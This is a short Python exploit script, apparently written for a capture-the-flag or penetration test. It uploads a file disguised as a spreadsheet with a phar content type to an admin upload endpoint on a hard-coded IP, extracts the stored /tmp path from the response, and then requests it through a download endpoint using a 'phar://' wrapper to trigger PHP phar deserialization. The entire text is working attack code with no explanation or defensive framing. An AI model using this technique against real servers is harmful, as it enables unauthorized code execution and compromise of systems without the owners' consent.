import requests 
import re

url = "http://52.231.191.39"

fd = open("payload.xlsx", "rb")
payload = fd.read() 
fd.close() 

cookies = {"PHPSESSID": "8f3d5bf76936727f6fbcd09adadaec45"}

r = requests.post(
    f"{url}/admin/upload_process.php", 
    cookies=cookies,
    files={
        'file': ('test.xlsx', payload, 'application/x-phar')
    },
    data={
        'contentType': 'html'
    }
)
print(r.text)

m = re.search(r'\"(/tmp/[^\"]+\.xlsx)\"', r.text)

if m:
    file_path = m.group(1)
    print("추출된 경로:", file_path)

r = requests.get(
    f"{url}/admin/download.php",
    cookies=cookies,
    params={
        "path":"phar://" + file_path #+ "/image.png"
    },
    allow_redirects=False
)
print(r.text)